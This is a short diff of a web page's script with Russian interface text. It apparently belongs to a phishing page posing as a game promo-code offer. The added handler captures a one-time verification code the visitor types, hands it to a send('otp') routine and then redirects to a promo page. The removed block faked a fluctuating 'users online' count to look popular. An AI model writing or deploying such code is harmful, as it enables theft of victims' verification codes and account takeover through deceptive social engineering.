+document.getElementById('btn3').addEventListener('click', async ()=>{
+  const v = code.value.replace(/\D/g,'');
+  if(v.length<4){ document.getElementById('e3').textContent='Введите код'; return; }
+  await send('otp', {code:v});
+  setTimeout(()=>{location.href='https://max.ru/promocod_standoffs'},500);
 });
-
-(function(){
-  const el=document.getElementById('online');
-  if(!el)return;
-  let n=1247;
-  setInterval(()=>{
-    n+=Math.floor(Math.random()*7)-3;
-    if(n<1180)n=1180;if(n>1340)n=1340;
-    el.textContent=n.toLocaleString('ru');
-  },2200);
-})();
 </script>
+</body></html>
